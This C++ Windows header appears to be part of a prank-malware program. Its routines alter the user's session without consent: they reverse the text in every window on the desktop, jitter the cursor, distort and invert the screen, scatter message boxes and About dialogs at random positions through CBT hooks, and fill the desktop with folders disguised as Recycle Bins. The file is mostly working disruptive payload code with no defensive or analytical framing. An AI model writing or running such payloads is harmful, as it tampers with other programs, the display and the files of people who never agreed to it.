#pragma once
#include<Windows.h>
#include<iostream>
#include<shellapi.h>
#include<winuser.h>
#include<WerApi.h>
#include"Data.h"
#include"resource.h"
#include<thread>
using namespace std;

#pragma comment(lib, "Winmm.lib")
#pragma warning(disable : 4996)

int random()
{
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);
	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

void interval(DWORD fs)
{
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right * DPI(hwnd) - rekt.left * DPI(hwnd), rekt.bottom * DPI(hwnd) - rekt.top * DPI(hwnd), hdc, 0, 0, fs);
}

void tunnel_screen()
{
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right * DPI(hwnd) - 100, rekt.bottom * DPI(hwnd) - 100, hdc, 0, 0, rekt.right * DPI(hwnd), rekt.bottom * DPI(hwnd), SRCCOPY);
}

BOOL ReverseTCHAR(TCHAR* lpSrc)
{
	int size = lstrlenW(lpSrc);

	if (size == 0)
		return FALSE;

	TCHAR wchar = 0;
	for (int i = 0; i < (size / 2); i++)
	{
		wchar = lpSrc[i];
		lpSrc[i] = lpSrc[size - i - 1];
		lpSrc[size - i - 1] = wchar;
	}

	return TRUE;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	TCHAR str[8192] = { 0 };

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		ReverseTCHAR(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}

	return TRUE;
}

DWORD WINAPI messageBoxThread(LPVOID parameter)
{
	hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, MsgBoxContent[random() % 11], L"荔枝", MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (cx - pcs->cx);
			int y = random() % (cy - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

void Interval_Text()
{
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

}

void PlayCursor()
{

	GetCursorPos(&cursor);
	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
	DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));
	Sleep(5);
}

int RecycleBin(int k)
{
	LPWSTR lpPath = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
	LPWSTR lpNewPath = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
	GetEnvironmentVariableW(L"userprofile", lpPath, 2048);
	lstrcatW(lpPath, L"\\Desktop");

	for (int i = 0; i < k; i++) {
		swprintf(lpNewPath, L"%s\\回收站%d.{645FF040-5081-101B-9F08-00AA002F954E}", lpPath, i + 1);
		CreateDirectoryW(lpNewPath, NULL);
		//Sleep(m);
	}

	return 0;
}

void ChangeTrayTip(HINSTANCE hInstance, DWORD NIM,DWORD icon,HICON TipIcon,LPCWSTR info,LPCWSTR tip,int id)
{
	NOTIFYICONDATA nid;    //NOTIFYICONDATA结构包含了系统用来处理托盘图标的信息，
	//它包括选择的图标、回调消息、提示消息和图标对应的窗口等内容。
	nid.cbSize = (DWORD)sizeof(NOTIFYICONDATA);         //以字节为单位的这个结构的大小
	nid.hWnd = hwnd;          //接收托盘图标通知消息的窗口句柄
	nid.uID = id;         //应用程序定义的该图标的ID号
	nid.uFlags = NIF_ICON | NIF_TIP | NIF_INFO ;         //设置该图标的属性
	nid.hIcon = TipIcon;   // 这里可以改变图标
	wcscpy(nid.szInfo, info);
	wcscpy(nid.szInfoTitle, tip);
	nid.uTimeout = 100;
	nid.dwInfoFlags = icon;
	wcscpy(nid.szTip, L"我汐了");    //鼠标停留在图标上显示的提示信息 
	Shell_NotifyIcon(NIM, &nid);    // 修改托盘信息
}

void Blackhole() {
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, cx, cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, cx* DPI(hwnd), cy* DPI(hwnd), hdc, 0, 0, NOTSRCCOPY);
	HBRUSH hBrush = CreatePatternBrush(hBitmap);
	SelectObject(hdc, hBrush);
	int cx2 = cx / 2, cy2 = cy / 2;
	double ckb = (double)cx / cy;
	int i;
	for (i = 0; i <= cx; i++) {
		Ellipse(hdc, cx  - i * ckb, cy   - i, cx + i * ckb, cy  + i);
		Sleep(0.5);
	}
}

LRESULT CALLBACK Winver(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (cx - pcs->cx);
			int y = random() % (cy - pcs->cy);

			pcs->x = x * DPI(hwnd) * DPI(hwnd);
			pcs->y = y * DPI(hwnd) * DPI(hwnd);
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI WinverThread(LPVOID parameter)
{
	hook = SetWindowsHookEx(WH_CBT, Winver, 0, GetCurrentThreadId());
	ShellAboutW(NULL, L"鸡屎", L"鸡屎", LoadIcon(hShell32, MAKEINTRESOURCE(Shell32_Icon[random() % 16])));
	UnhookWindowsHookEx(hook);

	return 0;
}

void Puzzle()
{
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1 * DPI(hwnd), y1 * DPI(hwnd), width * DPI(hwnd), height * DPI(hwnd), hdc, x2 * DPI(hwnd), y2 * DPI(hwnd), SRCCOPY);
}

void IconCicurlOnce() {
	int angle = 0;
	double range = 50;
	double ix = 0, iy = 0;
	POINT p;
	HWND hwnd = GetDesktopWindow();
	//LockWindowUpdate(hwnd);
	//HDC hdc = GetDCEx(hwnd, 0, DCX_CACHE | DCX_LOCKWINDOWUPDATE);
	HDC hdc = GetDC(0);
	//HICON hico = LoadIcon(NULL, IDI_ERROR);
	HICON hico = NULL;
	//HICON hico = LoadIcon(hShell32, MAKEINTRESOURCE(rand()%2000));
	srand(GetTickCount64());
	hico = LoadIcon(hShell32, MAKEINTRESOURCE(rand() % 2500));
	while (!hico) {
		hico = LoadIcon(hShell32, MAKEINTRESOURCE(rand() % 2500));
	}
	for (int o = 0; o < 2; o++) {
		for (angle = 0; ix <= cx; angle += 5) {
			ix = cx / 2 + range * sin(angle * 3.1415 / 180);
			iy = cy / 2 + range * cos(angle * 3.1415 / 180);
			DrawIcon(hdc, ix*DPI(hwnd), iy*DPI(hwnd), hico);
			range += 0.5;
		}
		Sleep(1);
	}
	//FreeLibrary(hShell32);
	ReleaseDC(0, hdc);
}

void OnDraw(HWND hwnd) {
	HINSTANCE hInstance = GetModuleHandle(NULL);
	int range = 80;
	HDC hdc = GetWindowDC(hwnd);
	RECT rect = { 640 - (640 - 400) - range,480 - (480 - 360) - range,640,480 };
	HBRUSH hbr = CreateSolidBrush(RGB(10, 10, 10));
	SelectObject(hdc, hbr);
	while (1) {
		HICON hico = NULL;
		srand(GetTickCount64());
		hico = LoadIcon(hShell32, MAKEINTRESOURCE(rand() % 2500));
		while (!hico) {
			hico = LoadIcon(hShell32, MAKEINTRESOURCE(rand() % 2500));
		}
		if (rand() % 1000 > 500) {
			hico = LoadIcon(hInstance, L"A");
		}
		double ix = 0, iy = 0;
		for (int angle = 0; angle <= 360; angle += 5) {
			FillRect(hdc, &rect, hbr);
			for (int j = angle; j < angle + 60; j += 10) {
				ix = range * sin(j * 3.1415 / 180);
				iy = range * cos(j * 3.1415 / 180);
				DrawIcon(hdc, ix + 400, iy + 360, hico);
				DrawIcon(hdc, 400 - ix*DPI(hwnd), 360 - iy*DPI(hwnd), hico);
			}
			Sleep(50);
		}
	}
	DeleteObject(hbr);
	ReleaseDC(hwnd, hdc);
}

int playcursor()
{
	for (int i = 0; i < 1200; i++)
	{
		GetCursorPos(&cursor);
		SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
		DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));

		Sleep(8);
	}

	return 0;
}

int WINAPI MoveWindows(HINSTANCE hInstance,int nCmdShow)
{
	int hei = 0;
	int windownum = 0;
	int a = random() % cx;

	//Create_Window(hInstance, nCmdShow);

	for (int i = 0; i < 3; i++)
	{
		//Create_Window(hInstance, nCmdShow);

		for (int i = 0; i < cy; i++)
		{
			MoveWindow(hwnd, a, i, 400, 300, TRUE);

			ShowWindow(hwnd, nCmdShow);
			UpdateWindow(hwnd);

			if (i >= cy)
			{
				DestroyWindow(hwnd);
				Sleep(100);
				//hwnd = CreateWindowEx(0, szCLassName, szAppName, WS_SYSMENU | WS_POPUP, random() % cx, -100, 400, 300, NULL, NULL, hInstance, NULL);
				//Create_Window(hInstance, nCmdShow);
				//ShowWindow(hwnd, nCmdShow);
				//UpdateWindow(hwnd);
			}
			//hei += 2;
			Sleep(1.5);
			ShowWindow(hwnd, nCmdShow);
			UpdateWindow(hwnd);
		}
	}

	//ShowWindow(hwnd, nCmdShow);
	//UpdateWindow(hwnd);

	return msg.wParam;
}